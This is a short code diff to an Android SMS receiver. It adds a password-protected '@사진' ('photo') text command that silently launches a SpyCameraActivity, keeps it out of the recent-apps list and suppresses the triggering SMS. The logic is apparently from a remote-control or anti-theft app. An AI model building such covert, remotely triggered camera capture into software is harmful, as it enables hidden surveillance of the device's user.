@@ -111,6 +111,15 @@ public class SMSReceiver extends BroadcastReceiver {
 							context.startActivity(startActivity);
 						}
 						abortBroadcast();
+					} else if (msg.startsWith("@사진")) {
+						if ((msg.startsWith("@사진 " + pass) || msg.startsWith("@사진" + pass)) && chkCamera) {
+							Intent startActivity = new Intent();
+							startActivity.setClass(context, SpyCameraActivity.class);
+							startActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+									| Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+							context.startActivity(startActivity);
+						}
+						abortBroadcast();
 					} 
 				}
 			}
